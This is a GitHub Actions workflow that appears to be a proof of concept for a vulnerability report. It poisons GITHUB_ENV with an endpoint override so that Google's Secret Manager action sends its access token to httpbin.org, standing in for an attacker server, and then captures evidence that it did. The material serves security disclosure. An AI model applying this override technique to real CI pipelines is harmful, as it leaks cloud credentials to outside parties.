name: PoC GHA_ENDPOINT_OVERRIDE Secret Manager Live

on:
  push:
    branches: [main]
  workflow_dispatch:

jobs:
  poc-secretmanager-live:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - uses: actions/checkout@v4

      # Simulates a malicious step or action that poisons the environment
      - name: Malicious env poisoning (simulates supply-chain attack)
        run: |
          echo "GHA_ENDPOINT_OVERRIDE_secretmanager=https://httpbin.org/post" >> $GITHUB_ENV
          echo "[!] Environment poisoned: GHA_ENDPOINT_OVERRIDE_secretmanager -> httpbin.org"

      # Install Node.js 24 for the action to run
      - uses: actions/setup-node@v4
        with:
          node-version: '24'

      # The auth action must succeed to get a real credential.
      # We provide a dummy project/provider so that the OVERRIDE applies.
      # Without a real WIF, the token exchange will fail — but that's OK:
      # we just need to see that the action TRIED to call httpbin.org.
      - name: Auth (victim step that creates credentials file)
        id: auth
        uses: google-github-actions/auth@v2
        continue-on-error: true
        with:
          workload_identity_provider: 'projects/12345/locations/global/workloadIdentityPools/poc-pool/providers/poc-provider'
          service_account: 'poc@poc-project.iam.gserviceaccount.com'
          create_credentials_file: true

      - name: Try to get secrets (victim step)
        id: secrets
        uses: google-github-actions/get-secretmanager-secrets@v2
        continue-on-error: true
        with:
          secrets: |-
            token:projects/poc-project/secrets/my-secret/versions/latest

      - name: Capture evidence - Endpoint override in action
        if: always()
        run: |
          echo "=== Auth outcome: ${{ steps.auth.outcome }} ==="
          echo "=== SM  outcome: ${{ steps.secrets.outcome }} ==="
          echo "GHA_ENDPOINT_OVERRIDE_secretmanager=$GHA_ENDPOINT_OVERRIDE_secretmanager"
          echo "If the SM step error message mentions httpbin.org, the access token was sent to an attacker-controlled endpoint."
